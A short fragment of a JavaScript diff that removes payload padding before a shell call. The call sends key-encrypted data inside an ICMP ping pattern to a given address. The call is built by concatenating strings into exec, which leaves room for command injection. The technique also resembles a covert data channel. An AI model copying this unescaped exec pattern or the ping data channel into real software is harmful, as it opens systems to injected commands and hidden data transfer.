@@ -30,9 +30,6 @@
                   ('0000' + (payload.length * 2).toString(16)).substr(-4) +
                   crypto.encrypt(payload, key);
 
-        while(payload.length < 16)
-          payload += '0';
-
         exec('ping -s 48 -c 1 -p ' + payload + ' ' + address);
       }
 
